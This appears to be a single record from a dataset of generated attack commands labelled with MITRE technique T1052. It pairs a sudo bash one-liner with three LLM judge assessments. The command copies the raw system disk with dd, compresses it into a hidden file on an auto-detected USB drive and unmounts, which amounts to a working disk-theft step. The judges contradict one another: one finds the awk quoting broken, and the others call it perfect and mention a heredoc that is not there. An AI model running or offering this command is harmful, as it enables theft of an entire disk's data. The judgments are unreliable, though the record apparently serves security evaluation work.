command: sudo bash -c 'UPART=$(lsblk -pn -o NAME,TRAN | awk "$2==\"usb\"{print $1\"1\"}" | head -n1); mkdir -p /mnt/usb && mount "$UPART" /mnt/usb && dd if=/dev/sda bs=4M status=none | gzip -1 > /mnt/usb/.sysdisk.gz && sync && umount /mnt/usb'
explanation: Reads raw data from the local system disk (/dev/sda), compresses it with gzip, and saves it to a mounted USB partition, ensuring data leaves only via physical media.
rationale_steps: Identify and mount the USB partition.
Read raw disk data locally using dd.
Compress the stream with gzip to reduce size.
Write to the USB, sync, and unmount.

llm_judgments.syntactic_justification: The command is well-formed with balanced quoting, proper separators, and valid options across lsblk, mount, dd, gzip, sync, and umount.
llm_judgments.semantic_justification: The workflow aligns with exfiltration to a USB device, but the awk program is misquoted so $1/$2 expand in the shell, likely leaving UPART empty and causing the mount (and thus the exfiltration) to fail.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper use of bash -c with single-quoted heredoc, correct awk quoting, valid command separators (&&), and proper variable expansion throughout.
llm_judgments.semantic_justification: The command precisely implements T1052 by auto-detecting a USB device via lsblk transport type, mounting it, performing a raw disk image of /dev/sda with dd, compressing it with gzip into a hidden dotfile (.sysdisk.gz) on the USB, syncing, and unmounting — fully consistent with physical medium exfiltration of an entire disk.

llm_judgments.syntactic_justification: The command is properly quoted and escaped, using valid shell syntax, balanced quotes, and logical command chaining.
llm_judgments.semantic_justification: The command successfully identifies a USB device via lsblk, mounts it, images the system disk with compression for exfiltration, and cleans up, perfectly matching the T1052 technique.
